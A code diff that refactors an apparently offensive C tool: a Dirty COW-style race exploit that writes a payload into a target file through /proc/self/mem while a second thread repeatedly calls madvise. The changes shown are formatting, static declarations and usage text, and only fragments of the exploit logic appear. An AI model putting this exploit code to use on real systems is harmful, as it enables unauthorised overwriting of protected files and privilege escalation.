@@ -16,21 +16,21 @@
 #include <sys/types.h>
 #include <sys/mman.h>
 
-#define ERR_IF(cond) \
-	do { \
-		if (cond) {	\
-			perror(__func__); \
+#define ERR_IF(cond)            \
+	do {                        \
+		if (cond) {             \
+			perror(__func__);   \
 			exit(EXIT_FAILURE); \
-		} \
+		}                       \
 	} while (0)
 
-#define ERR_IF_PTHREAD(status) \
-	do { \
-		int _val = status; \
-		if (_val > 0) {	\
+#define ERR_IF_PTHREAD(status)                                     \
+	do {                                                           \
+		int _val = status;                                         \
+		if (_val > 0) {	                                           \
 			fprintf(stderr, "%s: %s\n", __func__, strerror(_val)); \
-			exit(EXIT_FAILURE); \
-		} \
+			exit(EXIT_FAILURE);                                    \
+		}                                                          \
 	} while (0)
 
 #define VIRTUAL_MEMORY "/proc/self/mem"
@@ -48,7 +48,7 @@ typedef struct payload_info {
 } PayloadInfo;
 
 // Write payload to mmap'd memory
-void *writer_thread(void *arg) {
+static void *writer_thread(void *arg) {
 	PayloadInfo *info = arg;
 	char *str = info->payload;
 	char *payload_addr = (char *) info->loc_in_mem + info->offset;
@@ -65,7 +65,7 @@ void *writer_thread(void *arg) {
 }
 
 // Advise kernel to drop mapping
-void *madviser_thread(void *arg) {
+static void *madviser_thread(void *arg) {
 	PayloadInfo *info = arg;
 
 	for (int i = 0; i < THREAD_ITERATIONS && !stop; i++) {
@@ -75,7 +75,7 @@ void *madviser_thread(void *arg) {
 	return NULL;
 }
 
-void *wait_for_write(void *arg) {
+static void *wait_for_write(void *arg) {
 	PayloadInfo *info = arg;
 	size_t len = strlen(info->payload);
 
@@ -107,7 +107,7 @@ void *wait_for_write(void *arg) {
 }
 
 // Load Payload into string from specified file
-char *read_file(char *path) {
+static char *read_file(char *path) {
 	int fd = open(path, O_RDONLY);
 	ERR_IF(fd < 0);
 
@@ -122,19 +122,19 @@ char *read_file(char *path) {
 	return contents;
 }
 
-void usage(FILE* stream) {
+static void usage(FILE* stream) {
 	fprintf(stream, "Usage:\n");
-	fprintf(stream, "\t%s [-f FILE | -s STRING | -x HEX] [-o OFFSET | -a] TARGET_FILE\n\n", progname);
+	fprintf(stream, "\t%s [-h] [-f FILE | -s STRING] [-o OFFSET | -a] TARGET_FILE\n\n", progname);
 
 	fprintf(stream, "Options:\n");
-	fprintf(stream, "\t-f, --file  \t name of file contatining the payload\n"
-	                "\t-s, --string\t use command line arg string as payload\n"
-	                "\t-o, --offset\t offset postition for lseek (hex)\n"
+	fprintf(stream, "\t-f, --file  \t name of file containing payload\n"
+	                "\t-s, --string\t string to use as payload\n"
 	                "\t-a, --append\t append to target file\n"
-	                "\t-h, --help  \t help print out\n\n");
+	                "\t-o, --offset\t hex offset in file to write payload\n"
+	                "\t-h, --help  \t print this help message and exit\n\n");
 }
 
-void die(char *fmt, ...) {
+static void die(char *fmt, ...) {
 	if (fmt != NULL) {
 		va_list ap;
 		va_start(ap, fmt);
@@ -147,13 +147,13 @@ void die(char *fmt, ...) {
 	exit(EXIT_FAILURE);
 }
 
-off_t parse_hex(char *str) {
+static off_t parse_hex(char *str) {
 	unsigned int result;
 	sscanf(str, "%x", &result);
 	return (off_t) result;
 }
 
-PayloadInfo parse_opts(int argc, char *argv[]) {
+static PayloadInfo parse_opts(int argc, char *argv[]) {
 	PayloadInfo info = {
 		.offset = 0x0,
 		.append = false
@@ -250,4 +250,3 @@ int main(int argc, char *argv[]) {
 
 	return EXIT_SUCCESS;
 }
-
